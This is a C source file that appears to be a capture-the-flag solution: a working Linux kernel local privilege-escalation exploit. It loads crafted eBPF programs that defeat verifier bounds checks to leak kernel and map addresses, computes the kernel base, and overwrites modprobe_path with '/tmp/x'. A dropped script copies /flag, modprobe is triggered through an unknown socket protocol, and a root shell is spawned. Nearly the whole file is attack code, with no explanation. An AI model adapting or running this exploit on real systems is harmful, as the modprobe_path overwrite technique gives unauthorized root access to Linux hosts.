#define _GNU_SOURCE
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include "exp.h"
#include <fcntl.h>

static void write_file (const char *file, const char* data, mode_t mode){
	int f = open(file, O_WRONLY | O_TRUNC | O_CREAT, mode);
	if (f < 0){ perror ("open"); exit(1);}
	if((write(f, data, strlen(data))) < 0) {perror("write"); exit(1);};
	close(f);
}


int main(){
    puts("Start Exploit");

    int map_fd = create_map();
    uint64_t value = 1;
    update_map(map_fd, 0, &value, BPF_ANY);
    value = 0xcafebabe;
    update_map(map_fd, 1, &value, BPF_ANY);
    value = 0xdeadbeef;
    update_map(map_fd, 2, &value, BPF_ANY);



    struct bpf_insn ops[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_IMM(BPF_REG_2 , 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x8), 
        BPF_MOV64_REG(BPF_REG_2 , BPF_REG_10),    
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), 
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 36),
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0 , 0), 
        BPF_JMP_IMM(BPF_JGE, BPF_REG_6, 2, 34), 
        BPF_MOV64_IMM(BPF_REG_7, 1),  
        BPF_ALU64_REG(BPF_LSH, BPF_REG_7 , BPF_REG_6),  
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_7, 1), 
        BPF_MOV64_REG(BPF_REG_8,BPF_REG_7),
        BPF_MOV64_REG(BPF_REG_1,BPF_REG_0),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -0xf8), 
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, -0x88), 
        BPF_ALU64_REG(BPF_ADD, BPF_REG_0 , BPF_REG_8),
        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_0, 0), 
        BPF_ALU64_REG(BPF_ADD, BPF_REG_1 , BPF_REG_7),
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 0), 
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_IMM(BPF_REG_2, 0x0),  
        BPF_STX_MEM(BPF_DW, BPF_REG_10 , BPF_REG_2, -0x8), 
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_5, -0x10), 
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10), 
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
        BPF_MOV64_IMM(BPF_REG_4, BPF_ANY), 
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem), 
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_IMM(BPF_REG_2, 0x1), 
        BPF_STX_MEM(BPF_DW, BPF_REG_10 , BPF_REG_2, -0x8), 
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), 
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, -0x10),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
        BPF_MOV64_IMM(BPF_REG_4, BPF_ANY), 
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem), 
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0 , 0, 1),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0 , 0, 0),
        BPF_MOV64_IMM(BPF_REG_0 , 0x0),
        BPF_EXIT_INSN()
    };
    int prog_fd = create_prog(ops, sizeof(ops) / sizeof(struct bpf_insn));
    uint64_t leak_kernel=0,leak_map=0;
    int rc = lookup_map(map_fd, 0, &leak_kernel);
    rc = lookup_map(map_fd, 1, &leak_map);

    uint64_t kbase = leak_kernel -0x1d9a0;
    uint64_t modprobe_path = kbase + 0x4be1e0;
    uint64_t mymap = leak_map + 0x88;
    uint64_t magic = modprobe_path - mymap;

    printf("[*] kernel leak %lx: \n" , leak_kernel);
    printf("[*] kernel base %lx \n\n" ,kbase);
    printf("[*] map leak %lx \n" , leak_map);
    printf("[*] map  %lx \n\n" , mymap);
    printf("[*] magic  (modprobe_path - mymap) %lx \n" , magic);
    printf("[*] modprobe_path %lx \n\n\n" ,modprobe_path);

    value = 1;
    update_map(map_fd, 0, &value , BPF_ANY);

struct bpf_insn ops2[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd), 
        BPF_MOV64_IMM(BPF_REG_2 , 0),      
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x8), 
        BPF_MOV64_REG(BPF_REG_2 , BPF_REG_10),    
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 14),  
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0 , 0), 
        BPF_JMP_IMM(BPF_JGE, BPF_REG_6, 2, 12),  
        BPF_MOV64_IMM(BPF_REG_7, 1),  
        BPF_ALU64_REG(BPF_LSH, BPF_REG_7 , BPF_REG_6), 
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_7, 1),  
        BPF_MOV64_REG(BPF_REG_8,BPF_REG_7),
        BPF_MOV64_REG(BPF_REG_1,BPF_REG_0),
        BPF_LD_IMM64(BPF_REG_6, 0x782f706d742f),
        BPF_LD_IMM64(BPF_REG_4, magic),  
        BPF_ALU64_REG(BPF_MUL, BPF_REG_4 , BPF_REG_7),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_1 , BPF_REG_4),
        BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_6 ,0),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0 , 0, 0),
		    BPF_MOV64_IMM(BPF_REG_0 , 0x0),
        BPF_EXIT_INSN()
    };

    int prog_fd2 = create_prog(ops2, sizeof(ops2) / sizeof(struct bpf_insn));

    const char* new_path = "/tmp/x";
    const char* script = "#!/bin/sh\ncp /flag /tmp/flag\nchmod 755 /tmp/flag";
    write_file(new_path, script, 0777);
  	const unsigned char lmao[4] = {0xff, 0xff, 0xff, 0xff};
  	write_file("/tmp/dummy", lmao, 0777);
    socket(AF_INET, SOCK_STREAM, 123); // this triggers modprobe too
    system("cat /tmp/flag");
    system("/bin/sh"); 

    puts("End exploit");
    return 0;
}		